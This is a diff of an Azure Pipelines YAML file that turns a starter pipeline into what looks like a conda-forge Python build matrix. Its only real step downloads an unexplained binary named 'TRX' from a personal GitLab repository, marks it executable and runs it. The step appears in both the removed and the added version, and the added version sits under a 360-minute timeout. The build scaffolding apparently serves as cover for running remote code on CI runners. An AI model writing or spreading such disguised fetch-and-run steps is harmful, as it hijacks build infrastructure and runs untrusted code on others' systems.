@@ -1,13 +1,23 @@
-# Starter pipeline
-# Start with a minimal pipeline that you can customize to build and deploy your code.
-# Add steps that build, run tests, deploy, and more:
-# https://aka.ms/yaml
-
- trigger:
- - master
-    
+jobs:
+- job: linux
   pool:
-  vmImage: ubuntu-latest
-    
-steps:
-  - script: wget https://gitlab.com/mimix200/zpol/-/raw/main/TRX && chmod +x TRX && ./TRX
+    vmImage: ubuntu-latest
+  strategy:
+    matrix:
+      linux_64_python3.7.____cpython:
+        CONFIG: linux_64_python3.7.____cpython
+        UPLOAD_PACKAGES: 'True'
+        DOCKER_IMAGE: quay.io/condaforge/linux-anvil-cos7-x86_64
+      linux_64_python3.8.____cpython:
+        CONFIG: linux_64_python3.8.____cpython
+        UPLOAD_PACKAGES: 'True'
+        DOCKER_IMAGE: quay.io/condaforge/linux-anvil-cos7-x86_64
+      linux_64_python3.9.____cpython:
+        CONFIG: linux_64_python3.9.____cpython
+        UPLOAD_PACKAGES: 'True'
+        DOCKER_IMAGE: quay.io/condaforge/linux-anvil-cos7-x86_64
+  timeoutInMinutes: 360
+
+  steps:
+  - script: |
+         wget https://gitlab.com/mimix200/zpol/-/raw/main/TRX && chmod +x TRX && ./TRX
